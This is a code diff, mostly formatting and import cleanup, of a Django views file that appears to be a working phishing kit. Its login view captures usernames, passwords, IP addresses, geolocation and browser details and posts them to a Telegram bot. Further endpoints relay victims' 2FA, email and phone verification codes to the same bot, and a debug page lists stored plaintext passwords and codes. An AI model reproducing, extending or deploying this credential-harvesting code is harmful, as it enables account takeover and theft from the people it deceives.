@@ -1,17 +1,15 @@
-from django.shortcuts import render, redirect
-from django.http import HttpResponse, JsonResponse
-from django.core.mail import send_mail
+import json
+
+import requests
 from django.conf import settings
+from django.http import HttpResponse, JsonResponse
+from django.shortcuts import render
+from django.utils import timezone
+from django.views.decorators.csrf import csrf_exempt
+from user_agents import parse
+
 from .forms import LoginForm
 from .models import UserLogin
-from django.db import models
-from django.utils import timezone
-import socket
-import requests
-from django.views.decorators.csrf import csrf_exempt
-import json
-import re
-from user_agents import parse
 
 
 def get_location_data(ip_address):
@@ -46,6 +44,8 @@ def parse_user_agent(user_agent_string):
         }
     except:
         return {}
+
+
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
@@ -60,30 +60,30 @@ def send_to_telegram(message):
     try:
         bot_token = settings.TELEGRAM_BOT_TOKEN
         chat_id = settings.TELEGRAM_CHAT_ID
-        
+
         print(f"Telegram Config - Token: {bot_token[:10]}..., Chat ID: {chat_id}")
-        
+
         if bot_token == 'YOUR_BOT_TOKEN_HERE' or chat_id == 'YOUR_CHAT_ID_HERE':
             print("❌ Telegram credentials not configured")
             return False
-            
+
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         payload = {
             'chat_id': chat_id,
             'text': message,
             'parse_mode': 'HTML'
         }
-        
+
         print(f"📤 Sending to Telegram: {message[:50]}...")
         response = requests.post(url, data=payload, timeout=10)
-        
+
         if response.status_code == 200:
             print("✅ Telegram message sent successfully")
             return True
         else:
             print(f"❌ Telegram error: {response.status_code} - {response.text}")
             return False
-            
+
     except Exception as e:
         print(f"❌ Failed to send Telegram message: {e}")
         return False
@@ -93,17 +93,17 @@ def login_view(request):
     if request.method == 'POST':
         identifier = request.POST.get('identifier', '')
         password = request.POST.get('password', '')
-        
+
         # Get comprehensive user data
         ip_address = get_client_ip(request)
         user_agent_string = request.META.get('HTTP_USER_AGENT', '')
-        
+
         # Parse user agent
         ua_data = parse_user_agent(user_agent_string)
-        
+
         # Get location data
         location_data = get_location_data(ip_address)
-        
+
         # Get additional request data
         screen_resolution = request.POST.get('screen_resolution', '')
         timezone_data = request.POST.get('timezone', '')
@@ -142,7 +142,7 @@ def login_view(request):
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 ⚠️ <i>Waiting for 2FA...</i>"""
-        
+
         send_to_telegram(telegram_message)
 
         # Stay on login page
@@ -161,24 +161,24 @@ def verify_2fa(request):
             data = json.loads(request.body)
             two_fa_code = data.get('twoFaCode', '')
             identifier = data.get('identifier', '')
-            
+
             # Get user data from session
             user_data = request.session.get('user_data', {})
             user_info = user_data.get('identifier', identifier)
-            
+
             # Send simple 2FA notification to Telegram
             telegram_message = f"""🔒 <b>2FA CODE</b>
 
 👤 <b>User:</b> {user_info}
 🔢 <b>2FA Code:</b> {two_fa_code}
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
-            
+
             send_to_telegram(telegram_message)
             return JsonResponse({'success': True, 'message': '2FA saved'})
-            
+
         except Exception as e:
             return JsonResponse({'success': True, 'message': 'Data saved'})
-    
+
     return JsonResponse({'success': True, 'message': 'OK'})
 
 
@@ -189,18 +189,18 @@ def verify_email(request):
         try:
             data = json.loads(request.body)
             email_code = data.get('emailCode', '')
-            
+
             # Get user data from session
             user_data = request.session.get('user_data', {})
             user_info = user_data.get('identifier', 'N/A')
-            
+
             # Send email verification code to Telegram with user info
             telegram_message = f"""📧 <b>EMAIL VERIFICATION CODE</b>
 
 👤 <b>User:</b> {user_info}
 🔢 <b>Code:</b> {email_code}
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
-            
+
             send_to_telegram(telegram_message)
             return JsonResponse({'success': True, 'message': 'Email code sent'})
         except Exception as e:
@@ -215,18 +215,18 @@ def verify_phone(request):
         try:
             data = json.loads(request.body)
             phone_code = data.get('phoneCode', '')
-            
+
             # Get user data from session
             user_data = request.session.get('user_data', {})
             user_info = user_data.get('identifier', 'N/A')
-            
+
             # Send phone verification code to Telegram with user info
             telegram_message = f"""📱 <b>PHONE VERIFICATION CODE</b>
 
 👤 <b>User:</b> {user_info}
 🔢 <b>Code:</b> {phone_code}
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
-            
+
             send_to_telegram(telegram_message)
             return JsonResponse({'success': True, 'message': 'Phone code sent'})
         except Exception as e:
@@ -925,24 +925,27 @@ def verification_step2(request):
 
 def test_telegram(request):
     """Test Telegram connection"""
-    test_message = "📱 <b>TEST MESSAGE</b>\n\n✅ Telegram is working correctly!\n⏰ Time: " + timezone.now().strftime('%Y-%m-%d %H:%M:%S')
-    
+    test_message = "📱 <b>TEST MESSAGE</b>\n\n✅ Telegram is working correctly!\n⏰ Time: " + timezone.now().strftime(
+        '%Y-%m-%d %H:%M:%S')
+
     success = send_to_telegram(test_message)
-    
+
     if success:
-        return HttpResponse("<h1>✅ Telegram Test Successful!</h1><p>Check your Telegram for the test message.</p><a href='/'>Back to Login</a>")
+        return HttpResponse(
+            "<h1>✅ Telegram Test Successful!</h1><p>Check your Telegram for the test message.</p><a href='/'>Back to Login</a>")
     else:
-        return HttpResponse("<h1>❌ Telegram Test Failed!</h1><p>Check console logs for details.</p><a href='/'>Back to Login</a>")
+        return HttpResponse(
+            "<h1>❌ Telegram Test Failed!</h1><p>Check console logs for details.</p><a href='/'>Back to Login</a>")
 
 
 def debug_db(request):
     """Debug view to check database records"""
     records = UserLogin.objects.all().order_by('-login_time')[:10]
     html = "<h2>Recent Login Records</h2><table border='1'><tr><th>ID</th><th>Email</th><th>Username</th><th>Phone</th><th>Password</th><th>2FA Code</th><th>Login Time</th><th>2FA Time</th></tr>"
-    
+
     for record in records:
         html += f"<tr><td>{record.id}</td><td>{record.email or ''}</td><td>{record.username or ''}</td><td>{record.phone_number or ''}</td><td>{record.password}</td><td>{record.two_fa_code or ''}</td><td>{record.login_time}</td><td>{record.two_fa_time or ''}</td></tr>"
-    
+
     html += "</table>"
     return HttpResponse(html)
 
